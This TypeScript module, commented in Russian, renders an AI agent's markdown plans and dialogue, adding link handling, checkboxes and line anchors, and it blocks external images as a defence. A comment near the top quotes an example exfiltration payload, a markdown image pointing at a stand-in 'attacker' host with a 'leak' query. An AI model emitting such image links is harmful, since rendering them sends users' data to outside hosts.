import MarkdownIt from 'markdown-it'

// Единственный экземпляр markdown-it на модуль (конфигурация дословно из app.js).
const md = new MarkdownIt({ html: false, linkify: true })

// Внешние ссылки открываются в новой вкладке (decorateLinks в app.js) — через
// переопределение рендерера, чтобы работало с dangerouslySetInnerHTML без DOM-доступа.
const renderLinkOpen =
  md.renderer.rules.link_open ??
  ((tokens, idx, options, _env, self) => self.renderToken(tokens, idx, options))

md.renderer.rules.link_open = (tokens, idx, options, env, self) => {
  const token = tokens[idx]
  if (token === undefined) {
    return renderLinkOpen(tokens, idx, options, env, self)
  }

  if (token.attrIndex('target') < 0) {
    token.attrPush(['target', '_blank'])
    token.attrPush(['rel', 'noopener'])
  }

  return renderLinkOpen(tokens, idx, options, env, self)
}

// Глушение внешних markdown-картинок. `![](https://attacker/?leak)` — существующий канал эксфильтрации из
// текста агента: браузер тянет внешний URL при рендере.
const renderImage =
  md.renderer.rules.image ??
  ((tokens, idx, options, _env, self) => self.renderToken(tokens, idx, options))

// isSameOriginImageSrc — true для относительных/абсолютно-путевых ссылок того же
// origin; false для protocol-relative (`//host`) и любой явной схемы (`scheme:`).
export function isSameOriginImageSrc(src: string): boolean {
  if (src === '' || src.startsWith('//')) return false
  // Явная схема вида `http:`, `data:`, `javascript:` — RFC3986 scheme-префикс.
  if (/^[a-zA-Z][a-zA-Z0-9+.-]*:/.test(src)) return false
  return true
}

md.renderer.rules.image = (tokens, idx, options, env, self) => {
  const token = tokens[idx]
  const src = token?.attrGet('src') ?? ''
  if (!isSameOriginImageSrc(src)) {
    return escapeHtml(token?.content ?? '')
  }
  return renderImage(tokens, idx, options, env, self)
}

export type SpecialSection = {
  css: string
  icon: string
  label: string
}

const SPECIAL_SECTIONS: Record<string, SpecialSection> = {
  '## Assumptions': { css: 'plan-section-assumptions', icon: '⚠', label: 'Assumptions' },
  '## Acceptance Criteria': { css: 'plan-section-criteria', icon: '✓', label: 'Acceptance Criteria' },
}

// codeBlockLineRanges берёт 0-based [start,end) из markdown-it, чтобы маркеры картинок внутри любого
// code-блока оставались текстом.
export function codeBlockLineRanges(text: string): Array<[number, number]> {
  const ranges: Array<[number, number]> = []
  for (const token of md.parse(text, {})) {
    if ((token.type === 'fence' || token.type === 'code_block') && token.map !== null) {
      ranges.push([token.map[0], token.map[1]])
    }
  }
  return ranges
}

// Блочный рендер markdown: спецсекции (## Assumptions / ## Acceptance Criteria) в сворачиваемых обёртках +
// чекбоксы. Соответствует renderMarkdownHTML + decorate в текущем app.js.
export function renderMarkdown(text: string): string {
  if (text.trim() === '') return ''

  return decorateCheckboxes(splitAndRender(text))
}

// Нейтральный блочный рендер markdown БЕЗ plan-специфики: не сворачивает спец-секции и НЕ применяет
// decorateCheckboxes.
export function renderPlainMarkdown(text: string): string {
  if (text.trim() === '') return ''
  return md.render(text)
}

export function escapeHtml(value: string): string {
  return value.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
}

export function isSpecialSection(line: string): SpecialSection | null {
  return SPECIAL_SECTIONS[line.trim()] ?? null
}

export function isHeading2(line: string): boolean {
  return line.trim().startsWith('## ')
}

function splitAndRender(text: string): string {
  const lines = text.split('\n')

  const out: string[] = []
  let buffer: string[] = []
  let inSection = false
  let inCode = false

  const flush = () => {
    if (buffer.length > 0) {
      out.push(md.render(buffer.join('\n')))
      buffer = []
    }
  }

  for (const line of lines) {
    if (line.trim().startsWith('```')) {
      inCode = !inCode
      buffer.push(line)
      continue
    }

    if (inCode) {
      buffer.push(line)
      continue
    }

    const section = SPECIAL_SECTIONS[line.trim()]
    if (section !== undefined) {
      flush()
      if (inSection) out.push('</div></div>')
      out.push(
        `<div class="plan-section-wrapper ${section.css}">` +
          `<h2 class="section-header">${section.icon} ${section.label}</h2>` +
          `<div class="plan-section-body">`,
      )
      inSection = true
      continue
    }

    if (inSection && isHeading2(line)) {
      flush()
      out.push('</div></div>')
      inSection = false
    }

    buffer.push(line)
  }

  flush()
  if (inSection) out.push('</div></div>')

  return out.join('')
}

function decorateCheckboxes(html: string): string {
  return html
    .replace(/\[x\]/g, '<span class="cb cb-done">&#10003;</span>')
    .replace(/\[ \]/g, '<span class="cb cb-open">&#9744;</span>')
}

// Отдельный markdown-it для data-line якорей изолирует правила fence/checkbox от остальных рендеров;
// html:false.
const anchoredMd = new MarkdownIt({ html: false, linkify: true })

// Те же правила безопасности, что у общего `md`: внешние ссылки target=_blank/rel, глушение внешних
// (не-same-origin) картинок. Дублируем на anchoredMd, а не мутируем общий экземпляр.
const anchoredLinkOpen =
  anchoredMd.renderer.rules.link_open ??
  ((tokens, idx, options, _env, self) => self.renderToken(tokens, idx, options))

anchoredMd.renderer.rules.link_open = (tokens, idx, options, env, self) => {
  const token = tokens[idx]
  if (token === undefined) {
    return anchoredLinkOpen(tokens, idx, options, env, self)
  }
  if (token.attrIndex('target') < 0) {
    token.attrPush(['target', '_blank'])
    token.attrPush(['rel', 'noopener'])
  }
  return anchoredLinkOpen(tokens, idx, options, env, self)
}

const anchoredImage =
  anchoredMd.renderer.rules.image ??
  ((tokens, idx, options, _env, self) => self.renderToken(tokens, idx, options))

anchoredMd.renderer.rules.image = (tokens, idx, options, env, self) => {
  const token = tokens[idx]
  const src = token?.attrGet('src') ?? ''
  if (!isSameOriginImageSrc(src)) {
    return escapeHtml(token?.content ?? '')
  }
  return anchoredImage(tokens, idx, options, env, self)
}

// Token-aware чекбоксы: подменяем ТОЛЬКО правило `text` — вызываем сохранённый дефолтный рендерер, затем
// заменяем литеральные `[x]`/`[ ]` в его БЕЗОПАСНОМ результате.
const anchoredText =
  anchoredMd.renderer.rules.text ??
  ((tokens, idx) => escapeHtml(tokens[idx]?.content ?? ''))

anchoredMd.renderer.rules.text = (tokens, idx, options, env, self) => {
  return anchoredText(tokens, idx, options, env, self)
    .replace(/\[x\]/g, '<span class="cb cb-done">&#10003;</span>')
    .replace(/\[ \]/g, '<span class="cb cb-open">&#9744;</span>')
}

// fence/code_block wrapper-rule: номер строки лежит в token.meta.dataLine. Никогда не конкатенируем
// token.info/token.content напрямую (XSS).
function wrapFenceRule(defaultRule: NonNullable<typeof anchoredMd.renderer.rules.fence>) {
  return (
    tokens: Parameters<typeof defaultRule>[0],
    idx: number,
    options: Parameters<typeof defaultRule>[2],
    env: unknown,
    self: Parameters<typeof defaultRule>[4],
  ): string => {
    const inner = defaultRule(tokens, idx, options, env as never, self)
    const line = tokens[idx]?.meta?.dataLine as number | undefined
    if (line === undefined) return inner
    return `<div class="md-fence-anchor" ${anchorAttrString(line)}>${inner}</div>`
  }
}

const defaultFence =
  anchoredMd.renderer.rules.fence ??
  ((tokens, idx, options, _env, self) => self.renderToken(tokens, idx, options))
anchoredMd.renderer.rules.fence = wrapFenceRule(defaultFence)

const defaultCodeBlock =
  anchoredMd.renderer.rules.code_block ??
  ((tokens, idx, options, _env, self) => self.renderToken(tokens, idx, options))
anchoredMd.renderer.rules.code_block = wrapFenceRule(defaultCodeBlock)

// Один top-level markdown-блок, отрендеренный ЦЕЛИКОМ.
export type Block = { startLine: number; endLineExclusive: number; html: string }

// Секция: 'plain' — обычные блоки; 'special' — спец-секция плана, у которой ЗАГОЛОВОК вырезан.
export type Section = { kind: 'plain' | 'special'; special?: SpecialSection; blocks: Block[] }

// Атрибуты якоря, попадающие в innerHTML. Значения безопасны (только числовой номер строки), но React ими
// НЕ владеет — их навешивает/снимает императивный слой (Part B).
function anchorAttrPairs(line: number): Array<[string, string]> {
  return [
    ['data-line', String(line)],
    ['title', `Comment on line ${line}`],
    ['tabindex', '-1'],
    ['aria-keyshortcuts', 'Enter'],
    ['aria-description', `Press Enter to comment on line ${line}`],
  ]
}

function anchorAttrString(line: number): string {
  return anchorAttrPairs(line)
    .map(([k, v]) => `${k}="${v}"`)
    .join(' ')
}

// Кандидаты якорей: open-токены под-элементов + self-closing hr/fence/ code_block.
const OPEN_ANCHOR_CANDIDATES = new Set([
  'heading_open',
  'paragraph_open',
  'list_item_open',
  'blockquote_open',
  'tr_open',
])
const SELF_ANCHOR_CANDIDATES = new Set(['hr', 'fence', 'code_block'])

function isAnchorCandidate(token: { type: string; nesting: number; hidden: boolean; map: [number, number] | null }): boolean {
  if (token.map === null) return false
  if (OPEN_ANCHOR_CANDIDATES.has(token.type)) return token.nesting === 1 && !token.hidden
  if (SELF_ANCHOR_CANDIDATES.has(token.type)) return token.nesting === 0
  return false
}

// Аннотирует токены якорями. Вложенные кандидаты на ДРУГИХ строках (loose-list 2-й абзац, абзац
// blockquote, вложенный li) — самостоятельные якоря.
function annotateAnchors(tokens: ReturnType<typeof anchoredMd.parse>): void {
  const bestByLine = new Map<number, number>() // startLine(0-based) -> chosen token index

  for (let i = 0; i < tokens.length; i++) {
    const token = tokens[i]
    if (token === undefined || !isAnchorCandidate(token)) continue
    const line = (token.map as [number, number])[0]
    const current = bestByLine.get(line)
    // Строгое `<` сохраняет первый токен при равном level (ничья — по порядку).
    if (current === undefined || token.level < tokens[current]!.level) {
      bestByLine.set(line, i)
    }
  }

  for (const [line, idx] of bestByLine) {
    const token = tokens[idx]!
    const dataLine = line + 1
    if (token.type === 'fence' || token.type === 'code_block') {
      token.meta = { ...(token.meta ?? {}), dataLine }
    } else {
      for (const [k, v] of anchorAttrPairs(dataLine)) token.attrSet(k, v)
    }
  }
}

// Сегментация на top-level блоки: от open-токена уровня 0 до matching close уровня 0. Блок НЕ рвём —
// удаление одного heading_open оставило бы висячие inline+heading_close.
type TopBlockRange = { open: number; closeExclusive: number; map: [number, number] }

function topBlockRanges(tokens: ReturnType<typeof anchoredMd.parse>): TopBlockRange[] {
  const ranges: TopBlockRange[] = []
  let i = 0
  while (i < tokens.length) {
    const token = tokens[i]
    if (token === undefined || token.level !== 0) {
      i++
      continue
    }
    if (token.nesting === 1) {
      // Найти matching close уровня 0.
      let j = i + 1
      while (j < tokens.length && !(tokens[j]!.level === 0 && tokens[j]!.nesting === -1)) j++
      if (token.map !== null) ranges.push({ open: i, closeExclusive: j + 1, map: token.map })
      i = j + 1
    } else if (token.nesting === 0) {
      if (token.map !== null) ranges.push({ open: i, closeExclusive: i + 1, map: token.map })
      i++
    } else {
      i++
    }
  }
  return ranges
}

// renderAnchoredSections — главный anchored-рендер. ОДИН парс полного текста → token.map ГЛОБАЛЬНЫЕ.
export function renderAnchoredSections(
  text: string,
  opts: { specialSections: boolean },
): Section[] {
  if (text.trim() === '') return []

  const lines = text.split('\n')
  const env: Record<string, unknown> = {}
  const tokens = anchoredMd.parse(text, env)

  annotateAnchors(tokens)

  const renderBlockRange = (range: TopBlockRange): Block => {
    const slice = tokens.slice(range.open, range.closeExclusive)
    return {
      startLine: range.map[0] + 1,
      endLineExclusive: range.map[1] + 1,
      html: anchoredMd.renderer.render(slice, anchoredMd.options, env),
    }
  }

  const ranges = topBlockRanges(tokens)

  // DialogChannel: плоские блоки, спец-секции не трогаем.
  if (!opts.specialSections) {
    return [{ kind: 'plain', blocks: ranges.map(renderBlockRange) }]
  }

  // PlanPanel: группировка по спец-секциям.
  const sections: Section[] = []
  let current: Section = { kind: 'plain', blocks: [] }

  const pushCurrent = () => {
    // Пустые 'plain'-секции отбрасываем; 'special' сохраняем даже без блоков
    // (заголовок/обёртка должны отрисоваться).
    if (current.kind === 'special' || current.blocks.length > 0) sections.push(current)
  }

  for (const range of ranges) {
    const rawLine = lines[range.map[0]] ?? ''
    const special = isSpecialSection(rawLine)
    if (special !== null) {
      // Открываем новую спец-секцию, ВЫРЕЗАЯ её heading-блок (open+inline+close).
      pushCurrent()
      current = { kind: 'special', special, blocks: [] }
      continue
    }
    // Закрытие спец-секции — следующий top-level H2 (в т.ч. обычный ## Other),
    // который затем рендерится нормально в новой 'plain'-секции.
    if (current.kind === 'special' && isHeading2(rawLine)) {
      pushCurrent()
      current = { kind: 'plain', blocks: [] }
    }
    current.blocks.push(renderBlockRange(range))
  }
  pushCurrent()

  return sections
}
